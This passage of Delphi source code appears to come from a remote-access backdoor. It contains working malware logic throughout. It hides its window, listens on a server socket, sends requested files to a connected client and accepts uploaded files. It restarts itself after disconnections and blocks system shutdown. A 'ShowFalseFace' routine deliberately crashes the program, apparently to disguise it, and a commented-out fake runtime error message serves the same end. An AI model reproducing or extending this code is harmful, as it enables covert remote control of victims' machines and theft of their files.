      Height:=0; Width:=0; Left:=-1; Top:=-1;
      dtStartTime:=Now;
      SS.Port :=nPORT;
      SS.Open;
      //Icon.LoadFromStream (nil);
    end;
  end
  else
  begin
    MessageBox(0,PChar(ParamStr(3)),PChar(ParamStr(2)), MB_SYSTEMMODAL or MB_OK);
    halt;
  end;
except
    If (not IsChangedEXE) and ((LowerCase(ParamStr(1)) <> 'dontinstall') ) then
    begin
      //If error occured while installing let it shown up.
      raise;
    end;
end;
end;

procedure TMainForm.SSListen(Sender: TObject; Socket: TCustomWinSocket);
begin
  //ShowMessage('Listening...');
end;

procedure TMainForm.SendLines(sLines:TStrings);
var i:integer;
begin
  try
      for i:=0 to sLines.Count -1 do
      begin
        SendToClientLn(sLines[i]);
      end;
  except
  end;
end;

procedure TMainForm.SeperateTwoParams;
var nPos, nEndPos:integer; sTemp:string;
begin
  try
    sParam1:=''; sParam2:='';
    if sParam <> '' then
    begin
      if sParam[1] = '"' then
      begin
        //Find next quoate
        sTemp:=Copy(sParam,2,Length(sParam)-1);
        nPos:=Pos('"',sTemp);
        if nPos <> 0 then
        begin
          sParam1:=Copy(sTemp,1,nPos-1);

          //Find second quate
          sTemp:=Copy(sTemp,nPos+1,Length(sTemp)-nPos);
          nPos:=Pos('"',sTemp);
          if nPos <> 0 then
          begin
            //Find last quote
            nEndPos:=RPos(sTemp,'"');
            if nEndPos = 0 then nEndPos:=Length(sTemp)+1;
            sParam2:=Copy(sTemp,nPos+1,nEndPos-nPos-1);
          end
          else
          begin
            SendToClientLn(CombineCodeMsg(nREQ_TWO_PARAM_CODE,sREQ_TWO_PARAM_MSG));
          end;
        end
        else
        begin
          SendToClientLn(CombineCodeMsg(nREQ_TWO_PARAM_CODE,sREQ_TWO_PARAM_MSG));
        end
      end
      else
      begin
        SendToClientLn(CombineCodeMsg(nREQ_TWO_PARAM_CODE,sREQ_TWO_PARAM_MSG));
      end;
    end
    else
    begin
      SendToClientLn(CombineCodeMsg(nNO_PARAM_CODE,sNO_PARAM_MSG));
    end;
  except
  end;
end;

function CombineCodeMsg(nCode:integer; sMsg:string):string;
begin
  try
     Result:=IntToStr(nCode) + ' ' + sMsg;
  except
     Result:='Error occured in CombineCodeMsg function'
  end;
end;

function RPos(sString:string;cChar:Char):integer;
var i:integer;
begin
  try
    Result:=0;
    for i:=Length(sString) downto 1 do
    begin
      if sString[i]=cChar then
      begin
        Result:=i;
        Break;
      end;
    end;
  except
  end;
end;

function BoolToStr(bBool:Boolean):string;
begin
  try
    if bBool then
      result:='True'
    else
      result:='False';
  except
  end;
end;

procedure TMainForm.FormCloseQuery(Sender: TObject; var CanClose: Boolean);
begin
  try
    operations.gsKeyRoot := '\rea2';
    operations.gsKeyName :='LastExitTime';
    WriteStrKey(DateTimeToStr(Now));
  finally
    try
      if IsChangedEXE then
      begin
        //run another instance
        WinExec(PChar(ParamStr(0)),0);
      end;
    except
    end;
  end;
end;

procedure TMainForm.SendFile(sFileName:string);
var pBuff:PChar; f:File; nFileSize:integer;
begin
  try
    AssignFile(f,sFileName);
    Reset(f,1);
    nFileSize:=FileSize(f);
    GetMem(pBuff,nFileSize);
    BlockRead(f,pBuff^,nFileSize);
    SS.Socket.Connections[0].SendBuf(pBuff^,nFileSize);
  finally
    try
      CloseFile(f);
    finally
      FreeMem(pBuff);
    end;
  end;
end;

procedure ClearPutFileOperation;
begin
  try
    nCommandMode:=nCOMMAND_MODE;
    nInBytes:=-1;

    try
      CloseFile(fInFile);
    except
    end;
  except
  end;
end;

function AbortPutFile(pCharArr:PChar; nArrSize:Integer):Boolean;
var sAbortString:string; i:integer; bCommandFound:Boolean;
begin
  try
    bCommandFound:=false;
    if nArrSize >= Length(sABORT_PUT_CMD) then
    begin
      bCommandFound:=true;
      for i:=0 to Length(sABORT_PUT_CMD)-1 do
      begin
         if pCharArr[i] <> sABORT_PUT_CMD[i] then
         begin
           bCommandFound:=false;
           break;
         end;
      end;
    end;
    Result:=bCommandFound;
  except
  end;
end;

procedure TMainForm.FormPaint(Sender: TObject);
begin
  Visible:=False;
  //SetWindowLong(Handle,GWL_EXSTYLE,WS_EX_TOOLWINDOW);
end;

procedure TMainForm.MinuteTimerTimer(Sender: TObject);
begin
  try
    MinuteTimer.Tag := MinuteTimer.Tag + 1;
    if MinuteTimer.Tag >= 4 then
    begin
      MinuteTimer.Tag:=0;
      if nDisconnectCount >= 3 then
      begin
        //3 disconnection in 5 min - Something wrong is going on - so restart yourself
        nDisconnectCount:=0;
        try
          SS.Close;
        finally
          if WinExec(PChar(ParamStr(0)),0) > 31 then halt
          else
          begin
            ClearPutFileOperation;
            SS.Open;
          end;
        end;
      end
      else nDisconnectCount:=0;
      try
        SS.Open;
      except
      end;
    end;
  except
  end;
end;

procedure TMainForm.WMQUERYENDSESSION(var msg: TWMQUERYENDSESSION);
begin
  //Inherited;
  try
    msg.Result :=$FFFFFFFF;
    halt;
  except
    halt;
  end;
end;

function IsChangedEXE:Boolean;
begin
  try
    Result:=(LowerCase(ExtractFileName(ParamStr(0))) = ChangedEXEName);
  except
     Result:=True;
  end;
end;

procedure ShowFalseFace;
var a:TObject;
begin

   // Now carsh the program
   a.Free;

  //ShowMessage('Microsoft Bill Gates (Special Edition) can not start because you does not have correct version of VB runtime.');
end;


end.
